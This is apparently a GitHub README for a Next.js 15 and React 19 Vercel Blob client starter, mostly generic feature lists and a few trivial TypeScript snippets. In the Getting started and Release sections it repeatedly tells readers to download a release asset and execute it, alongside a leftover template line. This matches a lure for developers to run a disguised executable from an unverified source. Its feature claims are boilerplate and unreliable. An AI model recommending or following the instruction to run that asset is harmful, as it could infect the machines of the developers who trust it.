# Vercel Blob Client Starter for Next.js 15 & React 19

Release page: https://github.com/Gabriel1824/vercel-blob-client-starter/releases

[![Release](https://img.shields.io/badge/releases-Latest-blue?logo=github&logoColor=white)](https://github.com/Gabriel1824/vercel-blob-client-starter/releases)

A complete client-side Vercel Blob starter built for Next.js 15 and React 19. This project delivers a robust set of features for managing blob storage on the client side. It includes drag-and-drop uploads, progress tracking, multipart support, extensive configuration options, a file gallery, and copy/delete operations. It is crafted with TypeScript, Tailwind CSS v4, and shadcn/ui components. The codebase follows a clean architecture and provides strong SDK compliance for consistent integration with Vercel Blob services.

Table of Contents
- Overview
- Why this starter
- Tech stack
- Project structure
- Getting started
- Features and capabilities
- How it works
- Components and patterns
- Configuration and customization
- SDK compliance and best practices
- Demos and usage examples
- Testing and quality
- Accessibility
- Performance and optimization
- Security considerations
- Troubleshooting
- Roadmap
- Contributing
- License

Overview
This repository offers a ready-to-use client-side starter for Vercel Blob. It pairs Next.js 15 with React 19 to deliver a smooth, responsive experience. The project uses TypeScript for type safety, Tailwind CSS v4 for design, and shadcn/ui for a polished component library. It aims to be 100% SDK compliant, ensuring predictable behavior when interacting with blob storage APIs. The architecture emphasizes a clear flow from user actions to SDK calls, with a strong focus on developer experience, maintainability, and extensibility.

Why this starter
- Speed up development: Start from a solid baseline rather than wiring everything from scratch.
- Consistent UX: Drag-and-drop, progress indicators, and gallery views provide familiar user experiences.
- SDK fidelity: Designed to align with the Vercel Blob SDK surface, minimizing surprises when upgrading.
- Strong typing: TypeScript helps catch issues early and improves autocompletion.
- Modern UI: Tailwind CSS v4 and shadcn/ui deliver a clean, responsive, accessible UI.

Tech stack
- Next.js 15
- React 19
- TypeScript
- Tailwind CSS v4
- shadcn/ui components
- Vercel Blob SDK (compliant)
- Modern web APIs for file handling, drag-and-drop, and progress tracking
- Ecosystem tooling for linting, testing, and building

Project structure
- src/
  - app/                - Next.js app structure (routing, pages, layouts)
  - components/         - Reusable UI components (buttons, inputs, galleries)
  - features/             - Feature modules (upload, gallery, transform, etc.)
  - sdk/                  - Wrapper code around Vercel Blob SDK for a consistent API
  - styles/               - Tailwind and global styles
  - types/                - Type definitions for the app
  - hooks/                - Custom React hooks for state and side effects
  - lib/                  - Utilities (helpers, API clients, config)
- public/               - Static assets and images
- tests/                - Unit and integration tests
- README.md             - This file

Getting started
Note: The link to the releases page is supplied twice in this document. You will see the same URL at the top and again in a later section. From the releases page, download the release asset and execute it.

Prerequisites
- Node.js (12.x+ for older projects; this starter targets modern Node LTS)
- npm or pnpm or yarn for package management
- A browser that supports modern Web APIs (drag-and-drop, File API, etc.)
- Basic familiarity with Next.js and React concepts
- Access to a Vercel Blob account if you plan to use real blob storage in your environment

Installation
- Clone the repository:
  - git clone https://github.com/Gabriel1824/vercel-blob-client-starter.git
- Navigate to the project root:
  - cd vercel-blob-client-starter
- Install dependencies:
  - npm install
  - or: pnpm install
  - or: yarn install
- Start the development server:
  - npm run dev
  - or: pnpm dev
  - or: yarn dev
- Open your browser to http://localhost:3000 to see the app in action

If you prefer to jump straight to a release, see the top of this document for the release page URL and the badge. The release page provides the latest build assets and documentation tailored for quick demos. Release assets are hosted at the same URL: https://github.com/Gabriel1824/vercel-blob-client-starter/releases. From the releases page, download the release asset and execute it. The link has a path part (/releases), so this instruction applies.

Usage and workflows
- Drag and drop uploads
  - Drop files onto the designated drop zone to kick off an upload.
  - The UI displays a progress indicator for each file.
  - You can pause, resume, or cancel uploads as needed.
- Progress tracking
  - Real-time progress bars reflect the bytes uploaded vs total size.
  - Global progress shows an overall upload status across all files in the queue.
- Multipart uploads
  - Large files are split into chunks and uploaded sequentially or in parallel according to configuration.
  - Retry logic handles transient network failures gracefully.
- File gallery
  - The gallery provides previews for images and thumbnails for other file types.
  - Users can expand to view details, rename using inline editing, or apply actions on multiple selections.
- Copy and delete operations
  - Copy operations allow duplicating files within the blob storage or within the app’s gallery.
  - Delete operations remove files from the gallery and from the storage backend with a confirmation step.
- Advanced configuration
  - You can customize chunk size, retry policies, concurrency levels, and UI behaviors.
  - The configuration also covers authentication flow, caching policies, and SDK client options.
- SDK compliance
  - The app adheres to the Vercel Blob SDK surface guidelines, ensuring predictable behavior across environments.
  - Type-safe wrappers reduce boilerplate and drift between SDK versions.

How it works
- The client-side module interfaces with the Vercel Blob SDK through a thin layer that abstracts common operations:
  - Initialize client with authentication and endpoint configuration
  - Upload files via a drag-and-drop interface or programmatic calls
  - Track progress using events or observable streams
  - Manage a local gallery with metadata and live previews
  - Support multipart uploads for large files with resumable capabilities
- The UI layer uses Tailwind CSS v4 for styling and shadcn/ui components for consistency and accessibility
- TypeScript types provide strong guarantees for API usage and data structures
- The architecture emphasizes modularity so you can swap in your own blob storage backend if needed

Components and patterns
- Drag and drop zone
  - A accessible drop target that accepts common file types
  - Visual feedback on hover and drop
- Upload queue
  - A list that shows file name, size, status, and a progress bar
  - Actions for pause, resume, cancel, and retry
- Progress indicators
  - Per-file progress bars and a cumulative progress bar
  - Percent complete, estimated time remaining, and speed
- Preview gallery
  - Thumbnails for images, icons for other types
  - Lightbox for details with navigation between items
- Inline editing
  - Simple in-place editing for file names and metadata
- Copy and delete workflows
  - Bulk actions with confirmation prompts
  - Undo options for accidental deletes when possible
- Configuration panels
  - Expose key settings such as chunk size, concurrency, and retry rules
  - Simple toggles for enabling multipart uploads

Configuration and customization
- Tailwind CSS v4
  - PostCSS setup with the Tailwind plugin
  - Customizable theme with colors, typography, and utilities
- shadcn/ui integration
  - Primitives and components structured for consistency
  - Accessible components with keyboard support
- Next.js 15 and React 19 specifics
  - App router and server components in harmony with client components
  - Type-safe data fetching and SPA-like UX where appropriate
- TypeScript
  - Strong types for blob file metadata, upload results, and error handling
  - Generics for API wrappers to ensure flexibility
- SDK wrappers
  - A small abstraction layer around the Vercel Blob SDK
  - Consistent error handling and retry logic
- Environment and configuration
  - Environment variables for API keys, endpoints, and feature flags
  - Local development vs. production configuration guidance
- Customization steps
  - How to override default UI components with your own design system
  - How to adjust the gallery behavior and upload queues
  - How to plug in alternative backend storage or mock services for testing

SDK compliance and best practices
- The codebase adheres to the Vercel Blob SDK surface where possible
- Strong typing and explicit error handling reduce runtime surprises
- Clear separation between UI, data models, and storage interactions
- Safe defaults with opt-in advanced features to minimize risk
- Observability hooks for monitoring and debugging
- Accessible by design: keyboard navigation, ARIA labels, and clear focus management

Demos and usage examples
- Basic example: single-file upload
- Multiple files: queue and progress
- Large files: multipart upload with retry and pause
- Gallery interactions: preview, rename, and delete
- Copying assets within blob storage
- Cleanup and housekeeping: removing orphaned uploads

Sample code snippets
- Initialize SDK client (TypeScript)
  - import { createBlobClient } from "../sdk/blobClient";
  - const client = createBlobClient({ endpoint: "<endpoint>", credentials: "<token>" });
- Upload a file with progress
  - const result = await client.uploadFile(file, {
      chunkSize: 1048576, // 1 MB
      onProgress: (p) => console.log(`Uploaded ${p.loaded}/${p.total} bytes`),
    });
- Start a multipart upload
  - await client.multipartUpload(file, { partSize: 5242880, maxConcurrentParts: 4 });
- Retrieve gallery items
  - const items = await client.listFiles({ limit: 50, sort: "createdAt" });

Accessibility and inclusive design
- All interactive elements support keyboard focus and navigation
- Clear labels and defined roles for components
- Color contrast meets accessible standards
- Announcements for dynamic changes via ARIA live regions
- Consistent visual cues for state changes (loading, success, error)

Performance considerations
- Debounced updates to prevent UI thrashing
- Lazy loading of gallery items and thumbnails
- Efficient image preview generation when possible
- Caching of frequently accessed metadata to reduce API calls
- Efficient error handling with user-friendly messages

Testing and quality
- Unit tests for core utility functions
- Integration tests for the upload workflow
- Mocking for SDK calls to enable fast, isolated tests
- Linting and type checks enforced in CI
- Pre-commit hooks for formatting and basic checks

Troubleshooting
- Common issues with access to blob storage
- Network failures during multipart uploads
- Misconfigured endpoints or credentials
- Debug tips for inspecting upload progress and errors
- How to read and interpret logs and error messages

Roadmap
- Enhance cross-browser compatibility for file handling
- Add more export options for gallery items
- Expand multipart configuration with dynamic tuning
- Improve testing coverage for edge cases
- Support additional storage backends beyond Vercel Blob

Contributing
- Code of conduct and contribution guidelines
- How to set up a development environment
- How to run tests locally
- How to add new features or fix issues
- How to file a good bug report or feature request
- How to document API changes and upgrade notes

License
- This project is licensed under the terms described in the LICENSE file.
- Please review the license for permission to use, modify, and distribute.

Release and asset usage
- The releases page at the top of this document hosts the latest build assets and release notes. For quick access, visit the release page: https://github.com/Gabriel1824/vercel-blob-client-starter/releases. From the releases page, download the release asset and execute it. The link has a path part (/releases), so this instruction applies.
- To quickly share the latest release, you can use the badge link:
  [![Release](https://img.shields.io/badge/releases-Latest-blue?logo=github&logoColor=white)](https://github.com/Gabriel1824/vercel-blob-client-starter/releases)

Changelog and versioning
- Track changes across versions to help teams plan upgrades
- Each release entry includes a summary of changes, migration notes, and known issues
- Follow semantic versioning when tagging new releases

FAQ (frequently asked questions)
- What is Vercel Blob and how does this starter help?
  - Vercel Blob is a storage solution. This starter provides a client-side integration that works with the SDK. It focuses on a smooth UX for uploading, listing, and managing blobs.
- Do I need to run server-side code?
  - This starter focuses on the client side. Some deployments may require server-side support for authentication or proxying; adapt as needed.
- Can I replace UI components?
  - Yes. The architecture is designed to allow you to swap components while keeping core functionality intact.
- Is this ready for production?
  - It is designed for production-grade usage, with careful handling of errors, retries, and performance considerations. Adapt configurations to your environment.

Design notes
- The UI emphasizes clarity over novelty. Components are built for accessibility and consistency.
- The code adheres to modern TypeScript practices, with explicit types and clear interfaces.
- The styling uses Tailwind CSS v4 for rapid iteration and theming.
- shadcn/ui complements the component library with polished, accessible primitives.

Security considerations
- Avoid exposing sensitive credentials on the client side. Use proper authentication and least-privilege access.
- Validate file types and sizes on the client, and enforce server-side checks where appropriate.
- Ensure CORS policies and API endpoints are configured correctly to prevent data leakage.
- Keep dependencies up to date to minimize security vulnerabilities.

Notes on usage with real projects
- When integrating into an existing project, align the configuration with the project’s authentication scheme.
- If you customize the storage endpoint, ensure the SDK wrappers are updated accordingly.
- For large teams, consider adding a dedicated environment for storage operations and a separate deployment pipeline for storage-related changes.

Final remarks
- This starter provides a solid, well-structured base for client-side blob storage workflows. It combines a modern UI with robust storage interactions, focusing on reliability, performance, and developer experience.

End of document.